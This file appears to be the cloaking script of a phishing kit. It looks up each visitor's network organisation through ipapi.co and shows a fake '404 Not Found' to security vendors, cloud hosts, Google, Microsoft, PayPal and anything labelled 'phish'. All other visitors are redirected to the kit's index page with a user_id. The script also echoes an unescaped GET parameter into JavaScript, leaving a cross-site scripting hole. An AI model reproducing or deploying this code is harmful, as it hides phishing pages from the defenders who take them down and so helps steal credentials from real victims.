<?php
$rand = dechex(rand(0x000000, 0xFFFFFF));
$rand = sha1($rand);
?>

<script>
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://ipapi.co/org/', true);
    xhr.responseType = 'text';
    xhr.onload = function() {
        if (xhr.readyState === xhr.DONE) {
            if (xhr.status === 200) {
                var e<?php echo $rand; ?> = xhr.response;
                if (
                    e<?php echo $rand; ?>.indexOf("LGBT") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Amazon.com") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Amazon") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Chrome") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Google") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("phish") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Paypal") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("DedFiberCo") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Palo Alto Networks") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Digital Ocean") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("DigitalOcean") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Google Cloud") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Cloud") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("107.178.194.44") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Trustwave Holdings") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Holdings") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Trustwave") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("SoftLayer Technologies") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("SoftLayer") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("SurfControl") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("EGIHosting") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("LogicWeb") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Choopa") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Shinjiru") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("LogicWeb") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Total Server Solutions") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Brookhaven National Laboratory") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("OVH Hosting") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("XFERA Moviles S.A.") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("AVAST") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Privax Ltd.") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Privax") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("M247 Europe SRL") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Wintek Corporation") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Amazon.com, Inc.") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Kaspersky Lab AO") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("TELEFÔNICA BRASIL S.A") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("UK-2 Limited") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Online S.a.s.") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("BullGuard ApS") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("net4sec UG") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Datacamp Limited") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("HostDime.com, Inc.") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Digital Energy Technologies Ltd.") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("New Dream Network, LLC") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("LeaseWeb Netherlands B.V.") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Hetzner Online GmbH") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Rakuten Communications Corp.") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Forcepoint Cloud Ltd") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("IP Volume inc") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("NTT PC Communications, Inc.") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Liberty Global B.V.") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Google LLC") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("PALO ALTO NETWORKS") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("ColoCrossing") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Forcepoint, LLC") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("SINET, Cambodia's specialist Internet and Telecom Service Provider.") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("DigitalOcean, LLC") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Soyuz LTD") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Internap Corporation") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Nameshield SAS") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Microsoft Corporation") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("VNPT Corp") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("PVimpelCom") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("net4sec UG") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Wintek Corporation") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("EAGLE SKY CO LT") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("SoftLayer Technologies Inc.") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Leaseweb USA, Inc.") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("HETZNER") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("F5 Networks, Inc.") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("British Telecommunications PLC") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("GigeNET") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("FASTER CZ spol. s r.o.") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Cogent Communications") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Renater") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("InterNetX GmbH") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Forcepoint Cloud Ltd") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("The Corporation for Financing & Promoting Technology") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("PALO ALTO NETWORKS") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("TerraTransit AG") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Joshua Peter McQuistan") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Commtouch Inc.") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("YANDEX LLC") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("M247 Ltd") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("RateLimited") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Hot-Net internet services Ltd.") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("NTT Communications Corporation") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Hetzner Online GmbH") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Sungard Availability Network Solutions") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Network Solutions") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("McAfee") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Google Proxy") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Contina Communications, LLC") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("77") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Almouroltec Servicos De Informatica E Internet Lda") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("HL komm Telekommunikations GmbH") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Symantec Corporation") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("KVCHOSTING.COM LLC") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Tiscali SpA") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Vertical Telecoms Pty Ltd") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("1&1 Internet SE") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("AVAST Software s.r.o.") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Microsoft Corporation") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Total Server Solutions L.L.C") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("EVANZO e-commerce GmbH") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("TM Net, Internet Service Provider") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("ESET, spol. s r.o.") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Atlantic.net, Inc.") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("Venus Business Communications Limited") >= 0 ||
                    e<?php echo $rand; ?>.indexOf("OVH SAS") >= 0
                ) {
                    alert("404 Not Found");
                } else {
                    window.location.href = "index.html?user_id=<?=$_GET["user_id"]?>";
                }
            }
        }
    };

    xhr.send(null);
</script>